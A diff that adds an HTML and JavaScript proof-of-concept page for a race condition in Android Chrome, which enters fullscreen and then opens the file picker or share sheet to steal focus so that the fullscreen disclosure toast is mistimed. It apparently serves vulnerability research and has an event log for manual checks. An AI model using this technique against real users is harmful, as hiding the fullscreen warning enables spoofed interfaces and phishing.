@@ -1,1 +1,248 @@
-<h1>hohoho</h1>
+  <!doctype html>
+  <html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <title>Android Chrome Fullscreen Toast Race PoC</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+      :root {
+        --bg: #0f172a;
+        --panel: #111827;
+        --fg: #e5e7eb;
+        --muted: #94a3b8;
+        --accent: #22c55e;
+        --danger: #ef4444;
+      }
+      * { box-sizing: border-box; }
+      body {
+        margin: 0;
+        font: 16px/1.45 system-ui, sans-serif;
+        background: radial-gradient(circle at top, #1e293b, var(--bg));
+        color: var(--fg);
+        min-height: 100vh;
+        padding: 24px;
+      }
+      .wrap {
+        max-width: 860px;
+        margin: 0 auto;
+        display: grid;
+        gap: 16px;
+      }
+      .card {
+        background: rgba(17, 24, 39, 0.92);
+        border: 1px solid rgba(148, 163, 184, 0.25);
+        border-radius: 16px;
+        padding: 18px;
+        backdrop-filter: blur(8px);
+      }
+      h1 {
+        margin: 0 0 8px;
+        font-size: 24px;
+      }
+      p {
+        margin: 8px 0;
+        color: var(--muted);
+      }
+      button, input {
+        font: inherit;
+      }
+      button {
+        border: 0;
+        border-radius: 12px;
+        padding: 12px 16px;
+        cursor: pointer;
+        background: var(--accent);
+        color: #052e16;
+        font-weight: 700;
+        margin-right: 8px;
+        margin-bottom: 8px;
+      }
+      button.secondary {
+        background: #334155;
+        color: var(--fg);
+      }
+      .stage {
+        height: 260px;
+        border-radius: 14px;
+        background:
+          linear-gradient(135deg, rgba(34,197,94,.15), rgba(59,130,246,.12)),
+          repeating-linear-gradient(
+            45deg,
+            rgba(255,255,255,.03) 0,
+            rgba(255,255,255,.03) 12px,
+            rgba(255,255,255,0) 12px,
+            rgba(255,255,255,0) 24px
+          );
+        border: 1px solid rgba(255,255,255,.08);
+        display: grid;
+        place-items: center;
+        position: relative;
+        overflow: hidden;
+      }
+      .pulse {
+        width: 120px;
+        height: 120px;
+        border-radius: 999px;
+        background: radial-gradient(circle, #22c55e, #16a34a 55%, transparent 56%);
+        animation: pulse 700ms infinite ease-in-out alternate;
+        opacity: .9;
+      }
+      @keyframes pulse {
+        from { transform: scale(.88); filter: blur(0px); }
+        to { transform: scale(1.12); filter: blur(2px); }
+      }
+      #log {
+        white-space: pre-wrap;
+        font: 13px/1.45 ui-monospace, SFMono-Regular, Menlo, monospace;
+        color: #d1fae5;
+        background: #020617;
+        border-radius: 12px;
+        padding: 12px;
+        min-height: 220px;
+        max-height: 420px;
+        overflow: auto;
+      }
+      .note { color: #fde68a; }
+      .bad { color: #fca5a5; }
+    </style>
+  </head>
+  <body>
+    <div class="wrap">
+      <div class="card">
+        <h1>Android Chrome Fullscreen Toast Race PoC</h1>
+        <p>
+          Goal: trigger fullscreen, then immediately steal window focus using a native picker/share UI
+          before fullscreen layout completes.
+        </p>
+        <p class="note">
+          Test on Android Chrome. This page cannot read the browser toast directly; you verify by eye.
+        </p>
+        <button id="run-file">Run PoC via File Picker</button>
+        <button id="run-share" class="secondary">Run PoC via Share Sheet</button>
+        <button id="clear" class="secondary">Clear Log</button>
+        <input id="file" type="file" style="display:none">
+      </div>
+
+      <div class="card">
+        <div id="stage" class="stage">
+          <div class="pulse"></div>
+        </div>
+      </div>
+
+      <div class="card">
+        <p>What to look for:</p>
+        <p>
+          1. Tap one of the run buttons.
+          2. Chrome enters fullscreen.
+          3. Native file picker or share sheet opens immediately.
+          4. Dismiss it.
+          5. Watch for fullscreen disclosure toast appearing at the wrong time or after focus churn.
+        </p>
+        <div id="log"></div>
+      </div>
+    </div>
+
+    <script>
+      const stage = document.getElementById('stage');
+      const logEl = document.getElementById('log');
+      const fileInput = document.getElementById('file');
+
+      function log(msg) {
+        const ts = new Date().toISOString().split('T')[1].replace('Z', '');
+        logEl.textContent += `[${ts}] ${msg}\n`;
+        logEl.scrollTop = logEl.scrollHeight;
+      }
+
+      function forceLayoutNoise() {
+        stage.style.transform = `scale(${1 + Math.random() * 0.01})`;
+        stage.offsetHeight;
+        requestAnimationFrame(() => {
+          stage.style.transform = '';
+        });
+      }
+
+      async function enterFullscreen() {
+        if (!document.fullscreenElement) {
+          await document.documentElement.requestFullscreen();
+          log('requestFullscreen() resolved');
+        } else {
+          log('already fullscreen');
+        }
+      }
+
+      async function runWithFilePicker() {
+        log('starting file-picker race');
+        try {
+          await enterFullscreen();
+        } catch (e) {
+          log(`fullscreen failed: ${e}`);
+          return;
+        }
+
+        forceLayoutNoise();
+
+        setTimeout(() => {
+          log('opening file picker to steal focus');
+          fileInput.click();
+        }, 0);
+      }
+
+      async function runWithShareSheet() {
+        log('starting share-sheet race');
+        try {
+          await enterFullscreen();
+        } catch (e) {
+          log(`fullscreen failed: ${e}`);
+          return;
+        }
+
+        forceLayoutNoise();
+
+        setTimeout(async () => {
+          if (!navigator.share) {
+            log('navigator.share unavailable on this browser/device');
+            return;
+          }
+          try {
+            log('opening share sheet to steal focus');
+            await navigator.share({
+              title: 'Fullscreen Race',
+              text: 'Triggering Android Chrome fullscreen disclosure race',
+              url: location.href
+            });
+            log('share sheet closed normally');
+          } catch (e) {
+            log(`share sheet dismissed/error: ${e}`);
+          }
+        }, 0);
+      }
+
+      document.getElementById('run-file').addEventListener('click', runWithFilePicker);
+      document.getElementById('run-share').addEventListener('click', runWithShareSheet);
+      document.getElementById('clear').addEventListener('click', () => {
+        logEl.textContent = '';
+      });
+
+      fileInput.addEventListener('click', () => log('file input click dispatched'));
+      fileInput.addEventListener('change', () => log('file picker returned'));
+
+      document.addEventListener('fullscreenchange', () => {
+        log(`fullscreenchange: ${!!document.fullscreenElement}`);
+      });
+
+      document.addEventListener('visibilitychange', () => {
+        log(`visibilitychange: ${document.visibilityState}`);
+      });
+
+      window.addEventListener('focus', () => log('window focus'));
+      window.addEventListener('blur', () => log('window blur'));
+
+      document.addEventListener('pointerdown', () => {
+        log('pointerdown');
+      });
+
+      log('ready');
+    </script>
+  </body>
+  </html>
+
